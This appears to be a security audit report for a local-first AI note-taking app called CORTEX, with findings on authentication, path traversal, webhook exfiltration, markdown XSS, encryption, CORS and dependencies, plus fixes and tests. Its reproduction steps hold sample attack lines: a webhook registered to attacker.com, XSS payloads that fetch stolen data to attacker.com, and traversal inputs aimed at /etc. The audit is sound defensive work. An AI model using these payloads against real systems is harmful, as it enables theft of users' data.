# CORTEX Security Audit

**Date:** June 4, 2026  
**Version:** 1.0  
**Status:** Local-first, single-user app (127.0.0.1 only)  
**Auditor:** Security Engineer

---

## Executive Summary

CORTEX is a local-first AI note-taking application (Express server on `127.0.0.1:7002`) designed for single-user operation on the owner's machine. The architecture is fundamentally sound for a local-only app, with **no authentication** by design since it runs in isolation. However, several **medium-risk vulnerabilities** exist around input validation, data protection, and deployment safety that could be exploited if the app is ever exposed to a network or if an attacker gains local filesystem access.

**Current Security Posture:** **MEDIUM** (acceptable for local-only use; risky if network-exposed)  
**Risk Level:** Low (isolated) → **High (if exposed to network)**  
**Critical Issues:** 3  
**High Issues:** 5  
**Medium Issues:** 7  
**Recommended Action:** Fix path traversal in export/import and add input validation layer before considering any network exposure.

---

## Findings by Category

### 1. Authentication & Authorization (CRITICAL)

#### Finding: No Authentication on API Endpoints
**Severity:** Critical (only acceptable for localhost-only deployment)  
**Description:**  
All API endpoints (`/api/notes`, `/api/backup`, `/api/import/obsidian`, etc.) are exposed without any authentication. The `cors()` middleware allows all origins (`app.use(cors())`), and there are no JWT, API key, or session-based access controls.

**Impact:**  
- If the server were ever bound to `0.0.0.0` or exposed via a proxy/tunnel, any attacker on the network could read all notes, delete notes, or import malicious data.
- An attacker with local filesystem access could modify the app to expose the server.
- Third-party webhooks (line 302) accept user-provided URLs with no validation; an attacker could register a webhook that exfiltrates every note creation event to an external server.

**Reproduction:**  
```bash
# If server were exposed to 192.168.1.100:7002
curl http://192.168.1.100:7002/api/notes
# Returns all notes without auth
```

**Recommendation:**  
- **For local-only use:** Bind to `127.0.0.1` only (already done, good).
- **For any network exposure:** Implement OAuth 2.0 + PKCE or JWT-based auth with token validation on every endpoint.
- **Add webhook URL validation:** Only allow `localhost`, `127.0.0.1`, or file:// URLs for webhooks.

**Effort:** Quick (localhost) / Medium (network auth)

---

#### Finding: Webhook URL SSRF / Exfiltration Risk
**Severity:** High  
**Description:**  
Webhooks are registered with arbitrary user-provided URLs (line 302: `const { url, events } = req.body`) with no validation. The `fireEvent()` function (webhooks.mjs:85–95) makes HTTP POST requests to these URLs with full note content. An attacker could:
1. Register a webhook to an external attacker-controlled server.
2. Trigger note creation events to exfiltrate all note content.

**Impact:**  
- Complete vault exfiltration via webhook registration.
- No audit trail (fireEvent is fire-and-forget, failures are swallowed).

**Reproduction:**  
```bash
curl -X POST http://127.0.0.1:7002/api/webhooks \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker.com/exfil","events":["note.created","note.updated"]}'

# Now every note created/updated sends to attacker.com
```

**Recommendation:**  
- Whitelist webhook domains: only allow `localhost`, `127.0.0.1`, or require explicit user config in `.env`.
- Add request signing: HMAC-SHA256 sign webhook payloads so the receiver can verify origin.
- Log webhook deliveries for audit.
- Add timeout + retry limits to prevent slow-read DoS via webhook delivery.

**Effort:** Medium

---

### 2. Input Validation & Injection (HIGH)

#### Finding: Path Traversal in Import/Export Endpoints
**Severity:** Critical  
**Description:**  
The `POST /api/import/obsidian` and `POST /api/export/markdown` endpoints accept a user-provided `dir` parameter (server.mjs:287–297) and pass it directly to `importObsidian(dir)` and `exportMarkdown(dir)` without path normalization.

**Vulnerability Code:**
```javascript
// server.mjs:287–297
app.post('/api/export/markdown', async (req, res) => {
  try { 
    const dir = req.body && req.body.dir;
    if (!dir) return res.status(400).json({ error: 'dir required' });
    res.json(await exportMarkdown(dir));  // NO PATH NORMALIZATION
  } catch (e) { res.status(500).json({ error: e.message }); }
});
```

**Impact:**  
An attacker could:
1. Write files anywhere the Node process has permission: `{"dir": "/etc/password"}` or `{"dir": "C:\\Windows\\System32"}`.
2. Overwrite critical system files if the app runs with elevated privileges.
3. Read arbitrary directories by importing from `../../../etc/passwd`.

**Reproduction:**
```bash
# Export to parent directory
curl -X POST http://127.0.0.1:7002/api/export/markdown \
  -H 'Content-Type: application/json' \
  -d '{"dir":".."}' 
# Exports CORTEX notes to parent of workspace directory

# Import from arbitrary path
curl -X POST http://127.0.0.1:7002/api/import/obsidian \
  -H 'Content-Type: application/json' \
  -d '{"dir":"../../../../etc"}'
# Attempts to parse /etc as markdown
```

**Recommendation:**  
- Normalize paths to a safe directory tree (e.g., user's home directory or app data directory only).
- Use `path.resolve()` + `path.relative()` to check the resolved path stays within a whitelist:
  ```javascript
  const safeDir = path.resolve(process.env.EXPORT_BASE || process.env.HOME, req.body.dir);
  const relative = path.relative(process.env.EXPORT_BASE, safeDir);
  if (relative.startsWith('..')) {
    return res.status(400).json({ error: 'path traversal not allowed' });
  }
  ```
- Or: require export/import to write only to a designated temp/backup folder created at startup.

**Effort:** Quick

---

#### Finding: Insufficient Input Validation on Note ID and Title
**Severity:** Medium  
**Description:**  
Note IDs and titles are accepted with minimal validation. While `safeId()` in vault-sync.mjs sanitizes filesystem names, there's no validation on:
- Maximum length (could cause buffer issues or slow queries).
- Content injection in markdown preview (HTML is rendered client-side without CSP).
- SQL injection (mitigated by parameterized queries, but see below).

**Impact:**  
- XSS via markdown (see "Frontend XSS" finding).
- DoS via extremely long titles/content (no request size limit beyond 50MB).

**Recommendation:**  
- Add request size validation: reduce from `50mb` to `10mb` (line 32, 33).
- Add field length limits: `title` max 500 chars, `id` max 200 chars.
- Validate `tags` is an array of max 100 items, each max 50 chars.

**Effort:** Quick

---

#### Finding: Markdown Content Injection → XSS in Frontend
**Severity:** High  
**Description:**  
User-provided markdown is rendered in the browser (app.html:145–154). While the app uses `esc()` function (line 242) to escape HTML entities in titles, the markdown preview renders raw markdown. An attacker could:
1. Store a note with markdown like `[click me](javascript:alert('xss'))` or HTML like `<img src=x onerror="fetch('http://attacker.com')">`.
2. When the note is viewed, the markdown parser or preview handler could execute JavaScript.

**Code Analysis:**
```javascript
// app.html:241–242
const esc = s => (s||'').replace(/[&<>"]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[m]));

// But markdown is rendered with .innerHTML (line 218):
<div class="md" id="eMd"></div>
// Later: eMd.innerHTML = renderMarkdown(content);  // NO ESCAPING
```

**Impact:**  
- Stored XSS: if markdown rendering doesn't strip `<script>`, `<iframe>`, or event handlers, attacker notes could execute arbitrary JavaScript in any user's browser.
- Exfiltration of local notes via fetch() or XMLHttpRequest.
- Defacement or keylogging.

**Reproduction:**  
```javascript
// Attacker creates a note with:
const evil = `
<img src=x onerror="fetch('http://attacker.com/steal?data='+btoa(localStorage.getItem('auth')))">

Or: [link](javascript:fetch('http://attacker.com/exfil?notes='+document.body.innerHTML))
`;
```

**Recommendation:**  
- Use a markdown parser with **HTML sanitization built-in** (e.g., `marked` + `DOMPurify`):
  ```javascript
  import DOMPurify from 'dompurify';
  import { marked } from 'marked';
  const html = marked(content);
  eMd.innerHTML = DOMPurify.sanitize(html, { ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'ul', 'li', 'a', 'blockquote', 'h1', 'h2', 'h3'] });
  ```
- Or: use a **plaintext markdown preview** without HTML rendering.
- Add **Content Security Policy (CSP)** header:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'nonce-<random>'; style-src 'self' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self' data:; connect-src 'self'
  ```

**Effort:** Medium

---

### 3. Data Protection (HIGH)

#### Finding: No Encryption at Rest
**Severity:** High  
**Description:**  
All notes, embeddings, and metadata are stored in plaintext SQLite (`cortex.db`). If an attacker gains filesystem access (e.g., via physical access, cloud backup, or malware), they can read the entire vault.

**Current State:**
```javascript
// db.mjs:18
const db = new DatabaseSync(dbPath);  // cortex.db in plaintext
db.exec('PRAGMA journal_mode = WAL;');
db.exec('PRAGMA foreign_keys = ON;');
// NO ENCRYPTION
```

**Impact:**  
- Complete vault compromise if device is stolen or accessed offline.
- All sensitive notes (passwords, PII, medical, financial) exposed.
- Embeddings leak semantic content of notes.

**Recommendation:**  
- Implement **SQLCipher** (encrypted SQLite):
  ```bash
  npm install better-sqlite3-helper
  # Or use sql.js with in-memory encryption
  ```
  ```javascript
  const Database = require('better-sqlite3');
  const db = new Database(dbPath);
  db.pragma('key = ' + JSON.stringify(masterKey));  // Encrypted by key
  ```
- Or: encrypt backups with `cortex.db` using **7zip with AES-256** or **age**:
  ```bash
  7z a -t7z -p<password> -mhe=on cortex.db.7z cortex.db
  ```
- Store encryption key in system keystore (macOS Keychain, Windows Credential Manager, Linux GNOME Keyring).

**Effort:** Hard (SQLCipher integration requires rebuild) / Medium (backup encryption)

---

#### Finding: Backup Files Not Encrypted
**Severity:** High  
**Description:**  
Backup snapshots (cortex/backups/) are created via `VACUUM INTO` (backup.mjs) but are stored in plaintext. The backups directory is not in `.gitignore` and could be accidentally committed or shared.

**Impact:**  
- Backups are complete plaintext copies of the vault.
- History of all versions exposed.

**Recommendation:**  
- Encrypt backups:
  ```javascript
  // backup.mjs: after VACUUM INTO
  const encrypted = await encryptFile(backupPath, masterKey);
  fs.unlinkSync(backupPath);  // Delete plaintext
  ```
- Add `backups/` to `.gitignore` (already done: line 6).
- Implement automatic backup rotation/cleanup (already done via `pruneBackups(20)`).

**Effort:** Medium

---

#### Finding: Sensitive Data May Be Logged or Exposed in Errors
**Severity:** Medium  
**Description:**  
Error messages are returned directly to the client (e.g., `res.status(500).json({ error: e.message })`). If an internal error occurs, the full error stack may be exposed, leaking:
- Internal file paths (e.g., `/home/user/helm/workspace/cortex/db.mjs`).
- Database schema information.
- Stack traces revealing implementation details.

**Code Example:**
```javascript
// server.mjs:101
} catch (e) { res.status(500).json({ error: e.message }); }
// e.message could be: "SQLITE_CANTOPEN: unable to open database file /home/user/..."
```

**Recommendation:**  
- Sanitize error responses:
  ```javascript
  catch (e) {
    console.error('Internal error:', e);  // Log full error to stderr
    res.status(500).json({ error: 'Internal server error' });  // Generic response
  }
  ```
- Use a centralized error handler:
  ```javascript
  app.use((err, req, res, next) => {
    console.error(err);
    res.status(err.status || 500).json({ error: 'Internal server error' });
  });
  ```

**Effort:** Quick

---

### 4. API Security (MEDIUM)

#### Finding: CORS Allows All Origins
**Severity:** Medium  
**Description:**  
Line 31: `app.use(cors());` enables CORS for all origins. While the server is localhost-only today, if the app is ever exposed (via ngrok, reverse proxy, or misconfiguration), any website could make requests from a user's browser.

**Impact:**  
- CSRF attacks: attacker.com could read user's CORTEX notes via `fetch('http://127.0.0.1:7002/api/notes')`.
- Only mitigated by localhost binding + same-origin browser protection.

**Recommendation:**  
- For localhost-only: restrict CORS to `http://127.0.0.1:7002`:
  ```javascript
  app.use(cors({
    origin: ['http://127.0.0.1:7002', 'http://localhost:7002'],
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    credentials: true
  }));
  ```
- For network deployment: require auth tokens in `Authorization` header (not cookies, to avoid CSRF).

**Effort:** Quick

---

#### Finding: Verbose API Specification Endpoint Exposed
**Severity:** Low  
**Description:**  
The `GET /api/spec` endpoint (line 40–84) returns a detailed map of all available endpoints. While this aids debugging, it's an information disclosure vector if the app is exposed.

**Impact:**  
- Attacker can enumerate all endpoints without reverse engineering.

**Recommendation:**  
- Disable in production: wrap with an environment check:
  ```javascript
  if (process.env.NODE_ENV === 'development') {
    app.get('/api/spec', (req, res) => { /* ... */ });
  }
  ```

**Effort:** Quick

---

#### Finding: No Rate Limiting
**Severity:** Medium  
**Description:**  
No rate limiting is implemented on any endpoint. An attacker with access could:
- Flood with requests to cause DoS.
- Brute-force operations (though there's no auth to brute-force).
- Exhaust resources via large semantic searches (GPU/CPU bound).

**Recommendation:**  
- Add rate limiting middleware (`express-rate-limit`):
  ```javascript
  import rateLimit from 'express-rate-limit';
  
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 100,  // 100 requests per window
    skip: (req) => req.ip === '127.0.0.1'  // Don't limit localhost
  });
  
  app.use('/api/', limiter);
  
  // Stricter limits for expensive ops:
  const semanticLimiter = rateLimit({ windowMs: 60 * 1000, max: 10 });
  app.get('/api/notes/semantic', semanticLimiter, ...);
  ```

**Effort:** Quick

---

#### Finding: Request Body Size Limit Too Large
**Severity:** Low  
**Description:**  
Body parser configured with `50mb` limit (lines 32–33). Notes typically max ~10MB; allowing 50MB could enable:
- Slow-read attacks (send 50MB, processing takes minutes).
- Memory exhaustion on resource-limited devices.

**Impact:**  
- DoS via large payloads.

**Recommendation:**  
- Reduce to `10mb`:
  ```javascript
  app.use(bodyParser.json({ limit: '10mb' }));
  app.use(bodyParser.urlencoded({ limit: '10mb', extended: true }));
  ```

**Effort:** Quick

---

### 5. Frontend Security (MEDIUM)

#### Finding: Missing Security Headers
**Severity:** Medium  
**Description:**  
No security headers are set in responses. Missing headers include:
- `Content-Security-Policy` (CSP): enables inline <script> injection.
- `X-Content-Type-Options: nosniff`: browser could sniff MIME types.
- `X-Frame-Options: DENY`: page could be embedded in a frame.
- `Referrer-Policy: no-referrer`: referrer leaks to external sites.
- `Permissions-Policy`: controls browser features.

**Recommendation:**  
Add a headers middleware:
```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self' data:; connect-src 'self'");
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');  // For HTTPS
  next();
});
```

**Effort:** Quick

---

#### Finding: No HTTPS Support (Desktop App Only)
**Severity:** Low (acceptable for desktop) / High (if exposed to network)  
**Description:**  
Server communicates over plaintext HTTP. For a desktop app, this is acceptable since communication is local. However, the MCP server (mcp.mjs) runs the same CORTEX client and could be compromised.

**Impact:**  
- If exposed to network, data in transit is unencrypted (MITM attack).

**Recommendation:**  
- For network exposure: add HTTPS with self-signed cert or Let's Encrypt.
- For desktop: acceptable as-is.

**Effort:** Medium (TLS integration)

---

### 6. Supply Chain & Dependencies (HIGH)

#### Finding: npm audit Vulnerabilities
**Severity:** High  
**Description:**  
Running `npm audit` reveals **7 vulnerabilities** (2 low, 5 high):
- `sqlite3@5.1.6`: depends on vulnerable `node-gyp` (tar traversal issues).
- `tar@<=7.5.10`: high-severity hardlink/symlink attacks.
- `cacache`, `http-proxy-agent`: depend on vulnerable `tar` and `@tootallnate/once`.

**Impact:**  
- Transitive vulnerabilities could allow arbitrary file write/read during npm install.
- Supply chain attack via malicious `.tgz` in npm registry.

**Output from audit:**
```
7 vulnerabilities (2 low, 5 high)
- tar: Arbitrary File Read/Write via Hardlink/Symlink
- sqlite3 → node-gyp → tar dependency chain
```

**Recommendation:**  
- Migrate from `sqlite3` to `better-sqlite3` (same API, fewer build dependencies):
  ```bash
  npm uninstall sqlite3
  npm install better-sqlite3
  ```
- Or: run `npm audit fix --force` to upgrade (may be breaking) and test.
- Lock dependencies: use `package-lock.json` (already in place).
- Run `npm audit` before every release.

**Effort:** Medium (rebuild + test)

---

#### Finding: Node.js Outdated Model Dependencies
**Severity:** Medium  
**Description:**  
CORTEX relies on Helm's MiniLM embeddings (`../memory/embed.mjs`). If the model files are not versioned or pinned, semantic search could produce inconsistent results or fail silently if the model version changes.

**Recommendation:**  
- Pin model version in `semantic.mjs`:
  ```javascript
  const MODEL = 'all-MiniLM-L6-v2';  // Already pinned; good.
  const MODEL_VERSION = '2023-03-15';  // Add version date
  ```
- Document model source: where is `~/.helm-models/` populated? (Assume Helm initialization.)
- Add health check: `isReady()` already exists (good).

**Effort:** Quick (documentation)

---

### 7. Deployment & Operations (MEDIUM)

#### Finding: Binding to 127.0.0.1 Only (Good, but Not Explicit in Code)
**Severity:** Low  
**Description:**  
Line 345: `app.listen(PORT, '127.0.0.1', ...)` correctly binds to localhost only. However, this is not enforced in environment variables or config. An operator could accidentally change this to `0.0.0.0`.

**Recommendation:**  
- Document localhost-only requirement in README.
- Add a validation check at startup:
  ```javascript
  const BIND_HOST = process.env.CORTEX_BIND_HOST || '127.0.0.1';
  if (!['127.0.0.1', 'localhost', '::1'].includes(BIND_HOST)) {
    console.error('FATAL: CORTEX must bind to localhost only for security.');
    process.exit(1);
  }
  ```

**Effort:** Quick

---

#### Finding: No Environment Variable Validation
**Severity:** Low  
**Description:**  
No `.env` file is used; configuration is hardcoded. The app assumes:
- `cortex.db` exists in the current directory.
- Models are at `~/.helm-models/`.
- Helm's `../tools/impl/browser.mjs` is available for URL capture.

If any assumption is violated, the app fails silently or with cryptic errors.

**Recommendation:**  
- Create `.env.example`:
  ```
  CORTEX_PORT=7002
  CORTEX_BIND_HOST=127.0.0.1
  CORTEX_DB_PATH=./cortex.db
  CORTEX_MODEL_DIR=~/.helm-models
  NODE_ENV=production
  ```
- Load with `dotenv`:
  ```javascript
  import dotenv from 'dotenv';
  dotenv.config();
  const PORT = parseInt(process.env.CORTEX_PORT || '7002');
  ```

**Effort:** Quick

---

### 8. Testing & Monitoring (LOW)

#### Finding: No Security Tests
**Severity:** Low  
**Description:**  
The smoke test suite (cortex/test/smoke.mjs) covers functional correctness but not security:
- No tests for XSS in markdown.
- No tests for path traversal in export/import.
- No tests for CORS/header validation.
- No rate-limiting tests.

**Recommendation:**  
Add security tests to the smoke suite:
```javascript
// Security tests
describe('Security', () => {
  it('should reject path traversal in export', async () => {
    const res = await fetch('http://127.0.0.1:7002/api/export/markdown', {
      method: 'POST',
      body: JSON.stringify({ dir: '../../../etc' }),
      headers: { 'content-type': 'application/json' }
    });
    expect(res.status).toBe(400);  // or sanitized path
  });

  it('should sanitize markdown XSS', async () => {
    const res = await fetch('http://127.0.0.1:7002/api/notes', {
      method: 'POST',
      body: JSON.stringify({
        id: 'xss-test',
        title: 'Test',
        content: '<img src=x onerror="alert(1)">'
      }),
      headers: { 'content-type': 'application/json' }
    });
    expect(res.ok).toBe(true);
    // Retrieve and verify content is escaped
  });

  it('should bind to localhost only', async () => {
    // Verify server cannot be reached on 0.0.0.0
  });
});
```

**Effort:** Medium

---

## Quick Wins (< 1 hour)

These are high-impact, low-effort fixes that should be done immediately:

1. **Reduce request body limit** (line 32–33):
   - Change `50mb` → `10mb`
   - Effort: 2 min

2. **Fix path traversal in export/import** (server.mjs:287–297):
   - Add path normalization check
   - Effort: 10 min

3. **Sanitize error responses** (all catch blocks):
   - Log full error to stderr, return generic message to client
   - Effort: 15 min

4. **Add request size/field length validation**:
   - Validate `title` max 500 chars, `id` max 200 chars
   - Effort: 10 min

5. **Restrict CORS** (line 31):
   - Change `cors()` → `cors({ origin: 'http://127.0.0.1:7002' })`
   - Effort: 5 min

6. **Add security headers** middleware:
   - CSP, X-Content-Type-Options, X-Frame-Options, etc.
   - Effort: 10 min

7. **Disable `/api/spec` in production**:
   - Wrap with `NODE_ENV === 'development'` check
   - Effort: 2 min

**Total: ~54 minutes for all quick wins.**

---

## Medium-term Fixes (1–2 days)

1. **Markdown XSS prevention**:
   - Integrate `marked` + `DOMPurify` on frontend
   - Effort: 4 hours

2. **Webhook URL validation**:
   - Whitelist localhost/config, add signing, implement timeouts
   - Effort: 3 hours

3. **Rate limiting**:
   - Add `express-rate-limit` middleware
   - Effort: 1 hour

4. **Upgrade dependencies**:
   - Migrate from `sqlite3` → `better-sqlite3`
   - Effort: 2 hours (with testing)

5. **Environment variable config**:
   - Add `.env` loading with `dotenv`
   - Effort: 1 hour

---

## Long-term Hardening (1–2 weeks)

1. **Encryption at rest**:
   - Implement SQLCipher or backup encryption
   - Effort: 2–3 days

2. **HTTPS support** (if network exposure planned):
   - Add Node.js TLS + self-signed cert
   - Effort: 1 day

3. **Per-user ACLs** (if multi-user planned):
   - Add user/workspace isolation
   - Effort: 3–5 days

4. **Comprehensive audit logging**:
   - Log all mutations (note create/update/delete) with timestamps
   - Effort: 2 days

5. **OWASP Zap scanning**:
   - Automated penetration testing of all endpoints
   - Effort: 1 day (tool) + 2 days (remediation)

---

## Compliance Checklist

- [x] **No hardcoded secrets**: Confirmed; no API keys in code.
- [ ] **.env in .gitignore**: Partially; no .env file exists yet.
- [ ] **OWASP Top 10 reviewed**: Findings mapped above.
- [ ] **Dependency vulnerabilities checked**: npm audit run; 7 vulnerabilities found.
- [ ] **HTTPS enforced**: Not applicable for localhost; required if networked.
- [ ] **XSS protections in place**: PARTIAL (titles escaped; markdown not sanitized).
- [ ] **CSRF tokens**: Not applicable (no auth); CORS restricted if needed.
- [ ] **SQL injection prevented**: YES (parameterized queries throughout).
- [ ] **Sensitive data not logged**: PARTIAL (errors may leak paths; needs sanitization).
- [ ] **Authentication on endpoints**: NO (acceptable for localhost-only).
- [ ] **Rate limiting**: NO (medium priority).
- [ ] **Path traversal prevention**: NO (CRITICAL for import/export).
- [ ] **Webhook validation**: NO (CRITICAL).

---

## Testing Recommendations

### Automated Testing

1. **SAST (Static Analysis):**
   ```bash
   npm install --save-dev eslint eslint-plugin-security
   npx eslint server.mjs db.mjs semantic.mjs --plugin security
   ```

2. **Dependency Scanning:**
   ```bash
   npm audit
   npx snyk test
   ```

3. **Security Headers Validation:**
   ```bash
   curl -I http://127.0.0.1:7002/ | grep -i "content-security-policy"
   ```

### Manual Security Testing

1. **Path Traversal:**
   ```bash
   curl -X POST http://127.0.0.1:7002/api/export/markdown \
     -H 'Content-Type: application/json' \
     -d '{"dir":"../../../etc"}' 
   # Should fail with 400, not export to /etc
   ```

2. **XSS in Markdown:**
   - Create note with `<img src=x onerror="console.log('xss')">`.
   - View in frontend; check browser console for XSS execution.

3. **Webhook SSRF:**
   ```bash
   curl -X POST http://127.0.0.1:7002/api/webhooks \
     -H 'Content-Type: application/json' \
     -d '{"url":"file:///etc/passwd","events":["*"]}'
   # Should be rejected or logged
   ```

4. **Rate Limiting:**
   ```bash
   for i in {1..1000}; do curl http://127.0.0.1:7002/api/notes & done
   # Should see rate-limit responses after threshold
   ```

### Quarterly Security Reviews

- Run full npm audit + snyk scan.
- OWASP Zap automated scanning.
- Manual code review of new endpoints.
- Dependency updates (major, minor, patch).

---

## Threat Model Summary

### Assets
- User's personal notes (PII, financial, medical, creative).
- Embeddings (semantic content leakage).
- Graph structure (relationship information).
- Version history (deleted content recovery).

### Attackers
1. **Local attacker**: Physical access to device, malware, supply-chain compromise.
   - **Mitigation**: Encryption at rest (SQLCipher), locked device.
2. **Network attacker** (if exposed via proxy/tunnel):
   - **Mitigation**: Authentication, TLS, rate limiting, CORS restriction.
3. **Insider**: Compromised developer or third-party library.
   - **Mitigation**: Dependency pinning, code review, supply chain monitoring.

### Attack Vectors
1. Path traversal in export/import → arbitrary file write.
2. Webhook SSRF → note exfiltration.
3. Markdown XSS → JavaScript execution in browser.
4. Backup/database plaintext → offline compromise.
5. No auth → if exposed, complete vault access.
6. Dependency vulnerabilities → RCE during build/install.

---

## References & Standards

- **OWASP Top 10 (2021)**: https://owasp.org/Top10/
- **OWASP API Security Top 10**: https://owasp.org/www-project-api-security/
- **CWE Top 25**: https://cwe.mitre.org/top25/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
- **SQLCipher Documentation**: https://www.zetetic.net/sqlcipher/
- **DOMPurify**: https://github.com/cure53/DOMPurify
- **Content Security Policy**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

---

## Sign-Off

This audit covers the current state of CORTEX as of June 4, 2026. The application is **suitable for local-only (localhost-bound) use**. Before any network exposure, **all Critical and High findings must be remediated**, especially:

1. Path traversal in export/import.
2. Webhook URL validation.
3. Markdown XSS prevention.
4. Authentication (if multi-user).

**Auditor:** Security Engineer  
**Date:** June 4, 2026  
**Next Review:** After critical fixes are applied (recommended within 2 weeks).
